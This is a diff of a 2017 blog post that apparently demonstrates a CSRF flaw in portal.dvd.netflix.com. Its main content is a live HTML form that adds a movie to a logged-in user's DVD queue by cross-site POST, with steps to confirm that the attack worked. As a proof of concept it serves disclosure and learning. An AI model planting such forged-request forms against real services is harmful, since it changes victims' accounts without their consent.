@@ -1,6 +1,6 @@
 ---
 layout: post
-title: CSRF request to portal.dvd.com and portal.dvd.netflix.com
+title: CSRF request to portal.dvd.netflix.com
 date: 2017-11-09
 categories: [technology]
 tags: [csrf, security]
@@ -9,14 +9,13 @@ type: post
 published: true
 ---
 
-Okay, to make this work, login to dvd.netflix.com.
-
-Then, we are going to see if we can add a movie Boss Baby (80146758) to your queue by submitting a form here.
-
-<p>CSRF</p>
-
-Let's make a request to portal.dvd.netflix.com.
-
-<form method="post" action="https://portal.dvd.netflix.com/queue/add?titleIds=80146758">
-    <button type="submit">Submit CSRF request</button>
-</form>
+<ul>
+    <li>Okay, to make this work, <a href="https://dvd.netflix.com/Login">login</a> to dvd.netflix.com.</li>
+    <li><a href="https://dvd.netflix.com/Queue" target="_blank">go to your queue page</a> to make sure boss baby is NOT there.</li>
+    <li>Now, let's make a request to portal.dvd.netflix.com to add a movie Boss Baby (80146758) to your queue.
+    <form method="post" action="https://portal.dvd.netflix.com/queue/add?titleIds=80146758">
+        <button type="submit">Submit CSRF request</button>
+    </form>
+    .</li>
+    <li><a href="https://dvd.netflix.com/Queue" target="_blank">go to your queue page</a> to make sure boss baby IS there at the bottom.</li>
+</ul>
